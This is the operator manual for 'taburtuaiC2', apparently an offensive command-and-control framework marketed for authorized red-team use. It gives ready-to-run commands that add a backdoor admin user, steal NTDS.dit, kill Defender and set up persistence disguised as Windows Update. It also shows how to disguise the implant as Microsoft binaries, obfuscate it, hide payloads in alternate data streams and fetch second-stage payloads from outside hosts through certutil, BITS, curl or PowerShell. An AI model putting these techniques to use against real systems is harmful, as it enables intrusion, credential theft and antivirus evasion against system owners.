# taburtuaiC2 · Operator CLI

**Version** 2.1.0 &nbsp;·&nbsp; **Author** mjopsec &nbsp;·&nbsp; **License** MIT

> Authorized red team use only. All activity is logged server-side.

---

## Table of Contents

| # | Section |
|---|---------|
| 1 | [Getting Started](#1-getting-started) |
| 2 | [Global Flags](#2-global-flags) |
| 3 | [Interactive Console](#3-interactive-console) |
| 4 | [Agent Management](#4-agent-management) |
| 5 | [Interactive Shell](#5-interactive-shell) |
| 6 | [Command Execution](#6-command-execution) |
| 7 | [File Operations](#7-file-operations) |
| 8 | [Process Management](#8-process-management) |
| 9 | [Persistence](#9-persistence) |
| 10 | [Queue Management](#10-queue-management) |
| 11 | [Server & Logs](#11-server--logs) |
| 12 | [Level 1 Evasion](#12-level-1-evasion) |
| 13 | [Build Profiles](#13-build-profiles) |
| 14 | [Quick Reference](#14-quick-reference) |

---

## 1. Getting Started

### Build

```bash
# Build operator CLI
go build -o bin/operator ./cmd/operator

# Build agent (default profile)
go build -o bin/agent.exe ./agent

# Build agent with an OPSEC profile
# See Section 13 — Build Profiles
```

### Connect

```bash
# Via flag
./bin/operator --server http://172.23.0.118:9000 agents list

# Via environment variable (persists for the session)
export TABURTUAI_SERVER=http://172.23.0.118:9000
export TABURTUAI_API_KEY=your_secret_token
./bin/operator agents list

# Interactive console (recommended)
./bin/operator --server http://172.23.0.118:9000 console
```

### Agent ID Shorthand

All commands accept a full UUID or a unique prefix (6–8 chars minimum).

```bash
# Full UUID
./bin/operator shell 7d019eb7-3489-45f6-a2ab-c48d28d8e86c

# Short prefix — CLI resolves it automatically
./bin/operator shell 7d019eb7
```

---

## 2. Global Flags

| Flag | Short | Env Variable | Default | Description |
|------|-------|-------------|---------|-------------|
| `--server` | `-s` | `TABURTUAI_SERVER` | `http://localhost:8080` | C2 server URL |
| `--api-key` | `-k` | `TABURTUAI_API_KEY` | — | Bearer token for authenticated servers |
| `--timeout` | `-t` | — | `30` | HTTP request timeout in seconds |
| `--verbose` | `-v` | — | `false` | Print debug output |

---

## 3. Interactive Console

Launch a Metasploit-style REPL. The server is set once at startup — type commands without repeating `--server`.

```bash
./bin/operator --server http://172.23.0.118:9000 console

# With API key
./bin/operator --server http://172.23.0.118:9000 --api-key secret console
```

```
taburtuai(172.23.0.118:9000) › agents list
taburtuai(172.23.0.118:9000) › shell 7d019eb7
taburtuai(172.23.0.118:9000) › fetch 7d019eb7 http://10.0.0.1/payload.exe "C:\Temp\svc.exe" --method certutil
```

**Features**
- Arrow-key history navigation (↑/↓)
- History saved to `/tmp/.taburtuai_history`
- Quoted string support: `cmd execute 7d019eb7 "net user /add backdoor P@ss123"`
- `help` or `?` — grouped command reference
- `exit` / `quit` / Ctrl+D — end session
- Contextual error messages with usage hints

---

## 4. Agent Management

### `agents list`

```bash
operator agents list
```

**Status values**

| Status | Condition | Commands |
|--------|-----------|----------|
| `online` | Beaconed within last 10 min | Accepted immediately |
| `dormant` | No beacon for 10–30 min | Accepted — delivered on next beacon |
| `offline` | No beacon for > 30 min | Rejected |

> Thresholds configurable via `AGENT_DORMANT_SEC` / `AGENT_OFFLINE_SEC` on the server.

---

### `agents info <agent-id>`

```bash
operator agents info 7d019eb7
```

Shows OS, architecture, privileges, working directory, and beacon statistics.

---

### `agents delete <agent-id>`

Remove an agent record from the server database. Does not kill the running implant.

```bash
operator agents delete 7d019eb7
```

---

## 5. Interactive Shell

Start a persistent interactive shell session with an agent.

```bash
operator shell <agent-id> [--timeout <seconds>]
```

| Flag | Default | Description |
|------|---------|-------------|
| `--timeout` | `600` | Seconds to wait per command (must exceed max beacon interval + jitter) |

**Beacon interval vs timeout**

| Profile | Max beacon wait | Recommended `--timeout` |
|---------|----------------|------------------------|
| `default` | ~12s | 60 |
| `opsec` | ~78s | 180 |
| `stealth` | ~450s | 600 |
| `paranoid` | ~900s | 900 |

**Example**

```
  shell  7d019eb7  · exit to quit

[7d019eb7] › whoami
blackout\nurkh

[7d019eb7] › ipconfig /all
Windows IP Configuration
...

[7d019eb7] › exit
```

> For stealth agents with 300s+ beacons, always set `--timeout` higher than the max beacon interval. Stealth default: `shell 7d019eb7 --timeout 600`

---

## 6. Command Execution

### `cmd execute <agent-id> "<command>" [flags]`

Queue a single shell command and optionally wait for the result.

| Flag | Default | Description |
|------|---------|-------------|
| `--timeout` | `300` | Seconds to wait for the result |
| `--workdir` | — | Working directory on the agent |
| `--background` | `false` | Queue and return immediately |

```bash
operator cmd execute 7d019eb7 "whoami"
operator cmd execute 7d019eb7 "dir" --workdir "C:\Users\nurkh\Desktop"
operator cmd execute 7d019eb7 "net user backdoor P@ss123 /add" --background
```

---

### `status <command-id>`

```bash
operator status 5ba1dcad-5705-42bd-becd-3a749884216f
```

| Status | Meaning |
|--------|---------|
| `pending` | Waiting for agent beacon |
| `in_progress` | Agent executing |
| `completed` | Finished successfully |
| `failed` | Non-zero exit or error |
| `timeout` | Exceeded command timeout |

---

### `history <agent-id> [flags]`

```bash
operator history 7d019eb7 [--limit N] [--status STATUS]
```

| Flag | Default | Description |
|------|---------|-------------|
| `--limit` | `20` | Records to return (max 1000) |
| `--status` | — | Filter: `pending` · `completed` · `failed` |

---

## 7. File Operations

### `files upload <agent-id> <local-path> <remote-path>`

Upload a file from the operator machine to the agent.

```bash
operator files upload 7d019eb7 /tmp/payload.exe "C:\Windows\Temp\svc.exe"
```

> **ADS upload**: Use an ADS path as `<remote-path>` to write directly into a stream.
> ```bash
> operator files upload 7d019eb7 script.js "C:\Users\Public\readme.txt:update.js"
> ```

---

### `files download <agent-id> <remote-path> <local-path>`

Download a file from the agent. The file is saved on the C2 server.

```bash
operator files download 7d019eb7 "C:\Users\nurkh\NTDS.dit" /tmp/NTDS.dit
```

> If running the CLI remotely, retrieve the file from the C2 server separately after download.

---

## 8. Process Management

### `process list <agent-id>`

```bash
operator process list 7d019eb7
```

---

### `process kill <agent-id> [flags]`

```bash
operator process kill 7d019eb7 --pid 4821
operator process kill 7d019eb7 --name defender.exe
```

| Flag | Short | Description |
|------|-------|-------------|
| `--pid` | `-p` | Process ID to terminate |
| `--name` | `-n` | Process name (kills all matching) |

---

### `process start <agent-id> <executable> [flags]`

```bash
operator process start 7d019eb7 "C:\Windows\System32\cmd.exe"
operator process start 7d019eb7 "powershell.exe" --args "-NoProfile -File C:\tmp\run.ps1"
```

| Flag | Short | Description |
|------|-------|-------------|
| `--args` | `-a` | Arguments passed to the executable |

---

## 9. Persistence

### `persistence setup <agent-id> [flags]`

```bash
operator persistence setup <agent-id> --method <method> --path <exe> [flags]
```

| Flag | Required | Description |
|------|----------|-------------|
| `--method` | Yes | Persistence method (see table) |
| `--path` | Yes | Full path to executable on the target |
| `--name` | No | Entry name (auto-generated if omitted) |
| `--args` | No | Arguments passed at launch |
| `--wait` | No | Wait for agent confirmation |

**Methods**

| Platform | Method | Trigger | Privilege |
|----------|--------|---------|-----------|
| Windows | `registry_run` | User logon | User |
| Windows | `schtasks_onlogon` | User logon | User |
| Windows | `schtasks_daily` | Daily | User |
| Windows | `startup_folder` | User logon | User |
| Linux | `cron_reboot` | Reboot | User |
| Linux | `systemd_user` | User session | User |
| Linux | `bashrc` | Shell open | User |
| macOS | `launchagent` | User logon | User |

**Aliases**: `reg` → `registry_run` · `task` → `schtasks_onlogon` · `cron` → `cron_reboot` · `bash` → `bashrc`

```bash
operator persistence setup 7d019eb7 \
  --method registry_run \
  --path "C:\Windows\Temp\agent.exe" \
  --name "WindowsUpdate"

operator persistence setup 7d019eb7 \
  --method cron_reboot \
  --path /tmp/.agent
```

---

### `persistence remove <agent-id> [flags]`

```bash
operator persistence remove 7d019eb7 --method registry_run --name "WindowsUpdate"
```

Both `--method` and `--name` are required.

---

## 10. Queue Management

### `queue stats`

Show pending command counts across all agents.

```bash
operator queue stats
```

### `queue clear <agent-id>`

Flush all pending commands for an agent.

```bash
operator queue clear 7d019eb7
```

---

## 11. Server & Logs

### `logs [flags]`

```bash
operator logs [--limit N] [--level LEVEL]
```

| Flag | Default | Description |
|------|---------|-------------|
| `--limit` | `50` | Log entries to return |
| `--level` | — | `DEBUG` · `INFO` · `WARN` · `ERROR` |

### `stats`

Server health snapshot: uptime, agent counts, queue depth, command totals.

### `version`

Print CLI version string.

---

## 12. Level 1 Evasion

Level 1 features bypass signature-based AV and basic behavioral detection. Enabled via **build profiles** (Section 13) or operator commands.

---

### 12.1 Execution Methods

Controls how the agent spawns shell commands on the target. Set at build time via the profile's `exec_method` field.

| Method | Binary used | Parent seen by EDR | Notes |
|--------|------------|-------------------|-------|
| `cmd` | `cmd.exe /C` | agent process | Default for `default` profile |
| `powershell` | `powershell.exe -EncodedCommand` | agent process | Command string is base64-encoded |
| `wmi` | `wmic.exe process call create` | **WMI host (svchost.exe)** | Breaks parent-child chain; deprecated Win11 |
| `mshta` | `mshta.exe javascript:WScript.Shell.Run(...)` | **mshta.exe** | Output via temp file |

The `opsec` profile uses `powershell`, `stealth` uses `wmi`, `paranoid` uses `mshta`.

---

### 12.2 PE Masquerading

Embeds fake Windows PE metadata into the compiled binary. The binary appears as a legitimate Windows application in Explorer, Task Manager, and most AV scanners.

Configured in the build profile:

```yaml
masquerade:
  enabled: true
  company: "Microsoft Corporation"
  product: "Windows Update"
  description: "Windows Update Assistant"
  original_filename: "wuauclt.exe"
  version: "10.0.19041.1866"
```

Build the agent as usual — metadata is baked in automatically.

**Default masquerades per profile**

| Profile | Masquerades as |
|---------|---------------|
| `opsec` | `SecurityHealthService.exe` |
| `stealth` | `wuauclt.exe` (Windows Update) |
| `paranoid` | `MicrosoftEdgeUpdate.exe` |

---

### 12.3 Symbol & String Obfuscation (garble)

When `obfuscate: true` is set in the profile, the builder uses [`garble`](https://github.com/burrowers/garble) instead of `go build`. Garble:

- Randomizes all function/type/variable names
- Obfuscates string literals (C2 URL, keys, etc. are not visible in `strings` output)
- Removes debug info (`-tiny` flag)
- Produces a different binary hash on every build (`-seed=random`)

**Install garble once:**

```bash
go install mvdan.cc/garble@latest
```

Profiles with `obfuscate: true`: `stealth`, `paranoid`

---

### 12.4 ADS (Alternate Data Streams)

NTFS Alternate Data Streams hide data inside existing files. The host file appears normal — its size, hash, and visible content are unchanged.

#### `ads write <agent-id> <local-file> <target:stream>`

Write a local file into an ADS on the target.

```bash
# Write a JS payload into the readme.txt stream
operator ads write 7d019eb7 payload.js "C:\Users\Public\readme.txt:update.js"

# Write a PS1 script into a log file stream
operator ads write 7d019eb7 runner.ps1 "C:\ProgramData\app.log:svc.ps1"
```

The host file (`readme.txt`) must already exist on the target. Create it first if needed:
```bash
operator cmd execute 7d019eb7 "echo. > C:\Users\Public\readme.txt"
```

#### `ads exec <agent-id> <path:stream.ext>`

Execute a script stored in an ADS via the appropriate LOLBin.

| Extension | LOLBin used |
|-----------|------------|
| `.js` | `wscript.exe //E:jscript` |
| `.vbs` | `wscript.exe` |
| `.ps1` | `powershell.exe -EncodedCommand` |

```bash
operator ads exec 7d019eb7 "C:\Users\Public\readme.txt:update.js"
operator ads exec 7d019eb7 "C:\ProgramData\app.log:svc.ps1" --wait --timeout 30
```

#### `ads read <agent-id> <source:stream> <local-file>`

Read ADS contents back to the operator.

```bash
operator ads read 7d019eb7 "C:\Users\Public\readme.txt:update.js" /tmp/recovered.js
```

**Full ADS workflow example**

```bash
# 1. Create a host file on the target
operator cmd execute 7d019eb7 "type nul > C:\Users\Public\notes.txt"

# 2. Write JS payload into its stream
operator ads write 7d019eb7 stager.js "C:\Users\Public\notes.txt:svc.js"

# 3. Execute it via wscript
operator ads exec 7d019eb7 "C:\Users\Public\notes.txt:svc.js" --wait
```

---

### 12.5 LOLBin File Fetch

Tell the agent to download a file from any URL using a trusted Windows binary instead of making the network request from the agent process directly.

```bash
operator fetch <agent-id> <url> <remote-path> [--method METHOD] [--wait] [--timeout N]
```

| Flag | Default | Description |
|------|---------|-------------|
| `--method` | `certutil` | LOLBin: `certutil` · `bitsadmin` · `curl` · `powershell` |
| `--wait` | `false` | Wait for download to complete on the agent |
| `--timeout` | `120` | Seconds to wait |

**Methods**

| Method | Binary | Behavior | Notes |
|--------|--------|----------|-------|
| `certutil` | `certutil.exe` | HTTP GET + disk write | Present on all Windows; may be flagged by EDR now |
| `bitsadmin` | `bitsadmin.exe` | BITS transfer job | Traffic resembles Windows Update; cleans up job on completion |
| `curl` | `curl.exe` | HTTP GET | Native on Win10 1803+; clean, low-profile |
| `powershell` | `powershell.exe` | `WebClient.DownloadFile` | Works everywhere; PS is monitored by some EDR |

```bash
# Default certutil download
operator fetch 7d019eb7 http://192.168.1.10/agent2.exe "C:\Windows\Temp\svc.exe"

# BITS download (traffic looks like Windows Update)
operator fetch 7d019eb7 http://192.168.1.10/stage2.exe "C:\Windows\Temp\svc.exe" \
  --method bitsadmin --wait

# PowerShell WebClient download
operator fetch 7d019eb7 http://192.168.1.10/run.ps1 "C:\ProgramData\run.ps1" \
  --method powershell --wait --timeout 60

# Download to ADS (combine with ads exec)
operator fetch 7d019eb7 http://192.168.1.10/stager.js "C:\Users\Public\notes.txt:update.js" \
  --method curl --wait
operator ads exec 7d019eb7 "C:\Users\Public\notes.txt:update.js"
```

---

## 13. Build Profiles

Profiles are YAML files in `builder/profiles/`. Pass `--profile <name>` to the build script or generator to bake the settings in at compile time.

### Available Profiles

| Profile | Beacon | Exec Method | Masquerade | Garble | Use Case |
|---------|--------|-------------|-----------|--------|----------|
| `default` | 10s | `cmd` | off | off | Lab / VM testing |
| `aggressive` | 5s | `cmd` | off | off | CTF / fast iteration |
| `opsec` | 60s | `powershell` | SecurityHealthService | off | Real engagement, AV present |
| `stealth` | 300s ±50% | `wmi` | wuauclt.exe | ✓ | Long-haul persistence, EDR present |
| `paranoid` | 600s ±50% | `mshta` | MicrosoftEdgeUpdate | ✓ | High-value, SOC-monitored targets |

### Shell Timeout per Profile

Always set `--timeout` on the `shell` command to at least the profile's max beacon interval:

```bash
# default / aggressive
operator shell 7d019eb7

# opsec  (60s × 1.3 jitter ≈ 78s max)
operator shell 7d019eb7 --timeout 180

# stealth  (300s × 1.5 jitter = 450s max)
operator shell 7d019eb7 --timeout 600

# paranoid  (600s × 1.5 jitter = 900s max; also working-hours only)
operator shell 7d019eb7 --timeout 900
```

### Working Hours (paranoid profile)

The `paranoid` profile has `working_hours_only: true` with a 09:00–17:00 window. The agent **does not beacon outside those hours**. Commands queued after 17:00 execute on the next morning's first beacon.

If you need 24/7 access, set `working_hours_only: false` in the profile before building.

### Garble Setup

Required for `stealth` and `paranoid` profiles:

```bash
go install mvdan.cc/garble@latest
```

Verify installation:
```bash
garble version
```

---

## 14. Quick Reference

```
AGENTS
  agents list                                    list agents + status
  agents info <id>                               detailed agent info
  agents delete <id>                             remove agent record

EXECUTION
  shell <id> [--timeout N]                       interactive shell (set timeout > max beacon)
  cmd execute <id> "<cmd>" [--workdir] [--bg]    single command
  status <cmd-id>                                check command result
  history <id> [--limit] [--status]              execution history

FILES
  files upload   <id> <local>  <remote>          push file to agent
  files download <id> <remote> <local>           pull file from agent

PROCESS
  process list  <id>                             list running processes
  process kill  <id> --pid <n> | --name <x>      terminate process
  process start <id> <exe> [--args "..."]        launch process

PERSISTENCE
  persistence setup  <id> --method <m> --path <exe> [--name] [--args]
  persistence remove <id> --method <m> --name <n>

ADS (Windows NTFS — Level 1 Evasion)
  ads write <id> <local>       "<target:stream>"  write file into ADS
  ads read  <id> "<src:stream>" <local>           read ADS to local
  ads exec  <id> "<path:stream.js>"               execute script from ADS

LOLBIN FETCH (Level 1 Evasion)
  fetch <id> <url> <remote-path>                 download via certutil (default)
  fetch <id> <url> <remote-path> --method bitsadmin   via BITS (WU-like traffic)
  fetch <id> <url> <remote-path> --method curl        via curl.exe
  fetch <id> <url> <remote-path> --method powershell  via WebClient

QUEUE
  queue stats                                    pending command overview
  queue clear <id>                               flush pending queue

SERVER
  logs   [--limit] [--level]                     server event logs
  stats                                          server health snapshot
  version                                        CLI version
  console                                        interactive REPL
```
